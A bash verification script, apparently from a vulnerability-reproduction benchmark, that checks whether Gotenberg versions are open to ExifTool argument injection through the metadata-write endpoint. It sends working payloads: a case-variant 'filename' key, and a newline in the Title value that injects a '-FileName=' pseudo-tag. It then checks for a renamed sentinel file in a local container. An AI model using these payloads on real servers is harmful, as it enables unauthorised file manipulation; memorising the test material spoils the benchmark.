#!/usr/bin/env bash
# =====================================================================
# PCBV2-0050 gotenberg-cve-2026-40281  (CVE-2026-42589 -> CVE-2026-40281)
#   seed     (CVE-2026-42589): POST /forms/pdfengines/metadata/write，
#            metadata={"filename":"/tmp/pcb_key_<start-token>"} —— 大小写变体 key 绕过 V0 的
#            精确匹配 KEY 黑名单 {FileName,Directory} -> ExifTool 执行 -filename=
#            伪标签把上传的临时 PDF 重命名为 sentinel 路径。
#            V0 (8.29.1) 可达；V1 (8.30.1 EqualFold+SymLink/HardLink 黑名单) 阻断。
#   residual (CVE-2026-40281): metadata={"Title":"x\n-FileName=/tmp/pcb_val_<start-token>"}
#            —— VALUE 内的 newline 把 go-exiftool 写入 ExifTool stdin 的 "-Title=x"
#            一行拆成两行，第二行即攻击者控制的 "-FileName=..." 伪标签，
#            完全绕过 KEY 黑名单（修复只查了 "=" 左边）。V1 (值未校验) 可达；
#            V2 (8.31.0 validateMetadataValue 拒绝 \n\r\x00) 阻断。
#   判定通道: docker compose exec <ver> 检查 sentinel 文件存在（ExifTool 重命名落盘）。
#            Sentinel 路径嵌入 start 时植入的 PCB_FLAG，不是 verify 时的 RUN_FLAG。
#            exit 0 仅当 start-token == 当前 RUN_FLAG 且 sentinel 存在。
#            wrong/stale 只改 RUN_FLAG → 与 start-token 不一致 → 10。
#   退出码:   0=效果发生 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
SVC="$VERSION"

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

# Start-time token planted by start.sh (env + /pcb_flag.txt). Do not use verify-time
# RUN_FLAG here: flag_override would otherwise write AND find /tmp/pcb_*_WRONG.
PLANTED="$(dc exec -T "$SVC" sh -c 'cat /pcb_flag.txt 2>/dev/null || cat /tmp/pcb_flag.txt 2>/dev/null || printenv PCB_FLAG' 2>/dev/null \
  | tr -d '\r' | head -1)"
PLANTED="${PLANTED//$'\n'/}"
[[ -n "$PLANTED" ]] || { echo "ERR: start-time PCB_FLAG not planted in $SVC" >&2; exit 20; }

SENTINEL="/tmp/pcb_key_$PLANTED"
if [[ "$MODE" == "--residual" ]]; then SENTINEL="/tmp/pcb_val_$PLANTED"; fi

PORT="$(dc port "$SVC" 3000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$PORT" ]] || { echo "ERR: compose port lookup failed for $VERSION" >&2; exit 20; }

# 就绪探测：GET /health 200
"$PY" - "$PORT" <<'PYEOF'
import sys, urllib.request, time
port = sys.argv[1]
for _ in range(60):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/health", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: gotenberg $VERSION not ready" >&2; exit 20; }

dc exec -T "$SVC" sh -c "rm -f '$SENTINEL'" >/dev/null 2>&1 || true

# 上传 multipart：files=最小合法 PDF + metadata=JSON 字符串
STATUS="$("$PY" - "$PORT" "$SENTINEL" "$MODE" <<'PYEOF'
import sys, base64, json, secrets, urllib.request, urllib.error
port, sentinel, mode = sys.argv[1], sys.argv[2], sys.argv[3]
PDF = base64.b64decode(
    "JVBERi0xLjQKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZyAvUGFnZXMgMiAwIFIgPj4KZW5kb2JqCjIgMCBvYmoK"
    "PDwgL1R5cGUgL1BhZ2VzIC9LaWRzIFszIDAgUl0gL0NvdW50IDEgPj4KZW5kb2JqCjMgMCBvYmoKPDwgL1R5cGUg"
    "L1BhZ2UgL1BhcmVudCAyIDAgUiAvTWVkaWFCb3ggWzAgMCAyMDAgMjAwXSAvUmVzb3VyY2VzIDw8IC9Gb250IDw4"
    "IC9GMSA1IDAgUiA+PiA+PiAvQ29udGVudHMgNCAwIFIgPj4KZW5kb2JqCjQgMCBvYmoKPDwgL0xlbmd0aCAzOSA+"
    "PgpzdHJlYW0KQlQgL0YxIDE4IFRmIDIwIDEwMCBUZCAoUENCIHRlc3QpIFRqIEVUCmVuZHN0cmVhbQplbmRvYmoK"
    "NSAwIG9iago8PCAvVHlwZSAvRm9udCAvU3VidHlwZSAvVHlwZTEgL0Jhc2VGb250IC9IZWx2ZXRpY2EgPj4KZW5k"
    "b2JqCnhyZWYKMCA2CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDAwOSAwMDAwMCBuIAowMDAwMDAwMDU4IDAw"
    "MDAwIG4gCjAwMDAwMDAxMTUgMDAwMDAgbiAKMDAwMDAwMDI0MSAwMDAwMCBuIAowMDAwMDAwMzMwIDAwMDAwIG4g"
    "CnRyYWlsZXIKPDwgL1NpemUgNiAvUm9vdCAxIDAgUiA+PgpzdGFydHhyZWYKNDAwCiUlRU9GCg=="
)
if mode == "--seed":
    metadata = json.dumps({"filename": sentinel})            # KEY 注入（大小写变体）
else:
    metadata = json.dumps({"Title": "x\n-FileName=" + sentinel})  # VALUE 注入（newline）
boundary = "----pcb" + secrets.token_hex(8)
parts = []
parts.append(f"--{boundary}\r\n".encode())
parts.append(b'Content-Disposition: form-data; name="files"; filename="sample.pdf"\r\n'
             b"Content-Type: application/pdf\r\n\r\n")
parts.append(PDF + b"\r\n")
parts.append(f"--{boundary}\r\n".encode())
parts.append(b'Content-Disposition: form-data; name="metadata"\r\n\r\n')
parts.append(metadata.encode() + b"\r\n")
parts.append(f"--{boundary}--\r\n".encode())
body = b"".join(parts)
req = urllib.request.Request(
    f"http://127.0.0.1:{port}/forms/pdfengines/metadata/write",
    data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, method="POST",
)
try:
    with urllib.request.urlopen(req, timeout=40) as r:
        print(r.status)
except urllib.error.HTTPError as e:
    print(e.code)
except Exception:
    print(0)
PYEOF
)"
echo "metadata/write POST -> HTTP $STATUS"

sleep 4

EXISTS=0
if dc exec -T "$SVC" sh -c "test -e '$SENTINEL' && echo YES || echo no" 2>/dev/null | grep -q YES; then
  EXISTS=1
fi

# Pass only if the start-time token equals the current RUN_FLAG AND the sentinel exists.
# Wrong/stale overrides RUN_FLAG only → mismatch → 10 even if a leftover sentinel is present.
if [[ "$EXISTS" == "1" && "$PLANTED" == "$RUN_FLAG" ]]; then
  echo "OK: sentinel exists and start-token matches RUN_FLAG"
  exit 0
fi
echo "sentinel not present or start-token mismatch"
exit 10
